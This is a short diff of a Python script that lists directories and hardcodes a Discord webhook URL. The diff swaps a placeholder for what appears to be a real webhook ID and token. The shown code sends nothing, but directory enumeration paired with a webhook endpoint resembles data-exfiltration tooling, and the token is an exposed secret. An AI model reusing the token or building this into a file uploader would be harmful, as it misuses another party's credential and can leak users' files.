@@ -2,7 +2,7 @@ import os
 import requests
 
 # Replace with your Discord webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1268297928531902555/aT01mZfDNgV74kTg6rgZwXwNcxTvum6S3Q4hR-Ow0rtO5vZ7lrxtwvmStvzGWnMbR9QA'
 
 def get_all_directories(start_path):
     directories = []
